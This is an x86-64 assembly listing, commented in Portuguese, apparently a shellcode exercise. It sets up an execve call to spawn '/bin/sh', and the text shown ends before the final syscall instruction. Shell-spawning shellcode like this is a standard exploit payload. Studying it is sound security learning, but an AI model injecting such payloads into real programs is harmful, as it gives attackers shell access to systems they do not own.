global _start

section .text

_start:

        xor                     rdx,rdx                                 ; Zerando o registrador RDX
        mov                     qword rbx, '//bin/sh'   ; Enviando //bin/sh para rbx
        shr                     rbx, 8                                  ; Shift Right de 8 bits em RBX
        push            rbx                                             ; Empurrando RBX para pilha
        mov                     rdi, rsp                                ; Movendo /bin/sh para RDI
        push            rdx                                             ; Empurrando RDX para pilha
        push            rdi                                             ; Empurranbdo /bin/sh para pilha
        mov                     rsi, rsp                                ; Empurrando o topo da pilha para RSI
        mov                     rax, 59                                 ; Movendo para RAX a chamada do execve

